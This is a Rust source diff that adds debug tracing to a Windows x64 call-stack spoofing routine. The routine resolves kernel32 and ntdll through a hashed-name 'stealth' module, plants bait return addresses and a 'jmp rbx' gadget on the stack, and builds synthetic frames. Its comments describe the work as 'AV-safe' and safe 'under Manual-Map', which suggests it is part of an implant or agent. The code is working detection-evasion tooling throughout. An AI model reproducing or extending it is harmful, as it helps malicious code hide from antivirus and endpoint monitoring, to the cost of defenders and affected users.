@@ -15,6 +15,14 @@
 
 use std::sync::atomic::{AtomicUsize, Ordering};
 
+/// E2E breadcrumb — plain std fs append (no TLS, safe under Manual-Map).
+/// Includes a wall-clock stamp so callers across agent/module copies interleave clearly.
+/// Available on all Windows targets (hard spoof is x64-only; soft path still logs).
+#[cfg(windows)]
+fn tracef(msg: &str) {
+    crate::tracef_g(msg);
+}
+
 /// Spoof return address bait - BaseThreadInitThunk (thread-safe).
 #[cfg(all(windows, target_arch = "x86_64"))]
 static BAIT_K32: AtomicUsize = AtomicUsize::new(0);
@@ -35,9 +43,11 @@ fn ensure_hard_spoof_resolved() {
         return;
     }
     unsafe {
+        tracef("ensure: begin");
         let k32 =
             crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
         let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+        tracef(&format!("ensure: k32=0x{:X} ntdll=0x{:X}", k32, ntdll));
 
         if k32 != 0 {
             let bait = crate::stealth::get_api_addr(
@@ -49,6 +59,7 @@ fn ensure_hard_spoof_resolved() {
                 let _ = BAIT_K32.compare_exchange(0, bait, Ordering::AcqRel, Ordering::Acquire);
             }
         }
+        tracef(&format!("ensure: bait_k32=0x{:X}", BAIT_K32.load(Ordering::Acquire)));
         if ntdll != 0 {
             let bait = crate::stealth::get_api_addr(
                 ntdll,
@@ -68,6 +79,11 @@ fn ensure_hard_spoof_resolved() {
                 let _ = GADGET_RET.compare_exchange(0, ret, Ordering::AcqRel, Ordering::Acquire);
             }
         }
+        tracef(&format!(
+            "ensure: bait_nt=0x{:X} gadget=0x{:X}",
+            BAIT_NT.load(Ordering::Acquire),
+            GADGET_JMP_RBX.load(Ordering::Acquire)
+        ));
     }
 }
 
@@ -286,7 +302,9 @@ struct HardSpoofGuard {
 #[cfg(all(windows, target_arch = "x86_64"))]
 impl HardSpoofGuard {
     unsafe fn install(scan_floor: usize) -> Self {
+        tracef("install: begin");
         ensure_hard_spoof_resolved();
+        tracef("install: resolved");
         let bait_k32 = BAIT_K32.load(Ordering::Acquire);
         let bait_nt = BAIT_NT.load(Ordering::Acquire);
         let bait_primary = if bait_k32 != 0 { bait_k32 } else { bait_nt };
@@ -294,6 +312,7 @@ impl HardSpoofGuard {
         let rsp = read_rsp();
         let rbp = read_rbp();
         let image = current_image_range().unwrap_or((0, 0));
+        tracef(&format!("install: img={:X}..{:X} floor={:X}", image.0, image.1, scan_floor));
         let mut patches: Vec<StackPatch> = Vec::new();
 
         // --- Targeted return rewrite only (no blind stack spray — AV-safe) ---
@@ -301,6 +320,7 @@ impl HardSpoofGuard {
         //    exact word on the near stack and replace with a trusted bait.
         if bait_primary != 0 && image.0 != 0 {
             let returns = capture_stack_returns(16);
+            tracef(&format!("install: captured {}", returns.len()));
             // Near-stack window only (current frame + a few parents)
             let scan_words = 0x200 / 8;
             let base = rsp as *mut usize;
@@ -343,6 +363,7 @@ impl HardSpoofGuard {
                 }
             }
         }
+        tracef(&format!("install: scan done patches={}", patches.len()));
 
         // 2) RBP+8 return slot — ONLY when RBP is a validated frame pointer.
         // Release Rust often omits frame pointers; raw RBP is then a GPR holding
@@ -362,6 +383,7 @@ impl HardSpoofGuard {
                 }
             }
         }
+        tracef(&format!("install: rbp slot {}", if rbp_ret_slot.is_some() { "rewritten" } else { "skipped" }));
 
         // 3) Synthetic RBP frames (locals only — do NOT splice into live RBP chain;
         //    splicing corrupted Rust/MSVC frames and caused AVs on restore/return).
@@ -389,6 +411,7 @@ impl HardSpoofGuard {
         core::ptr::read_volatile(&frames[0].ret_addr);
         core::ptr::read_volatile(&frames[1].ret_addr);
         core::ptr::read_volatile(&frames[0].next_rbp);
+        tracef("install: frames ok, returning");
 
         Self {
             patches,
@@ -551,6 +574,7 @@ where
     F: FnOnce() -> R,
 {
     add_stack_noise();
+    tracef("spoof: wrapper enter");
 
     #[cfg(all(windows, target_arch = "x86_64"))]
     {
@@ -579,7 +603,9 @@ where
         // restore() can put the original back. Passing floor lets install() skip
         // any slot below it, which is exactly install's frame + return slot.
         let scan_floor = read_rsp();
+        tracef("spoof: install begin");
         let guard = HardSpoofGuard::install(scan_floor);
+        tracef("spoof: install done");
         // Pin baits as stack locals (extra cover for walkers that sample locals)
         let bait = BAIT_K32.load(Ordering::Acquire);
         let mut synthetic = [0usize; 4];
@@ -590,9 +616,12 @@ where
             synthetic[3] = GADGET_JMP_RBX.load(Ordering::Acquire);
         }
         let _pin = core::ptr::read_volatile(&synthetic[0]);
+        tracef("spoof: f begin");
         let result = f();
+        tracef("spoof: f done");
         let _ = core::ptr::read_volatile(&synthetic[0]);
         guard.restore();
+        tracef("spoof: restore done");
         result
     }
 }
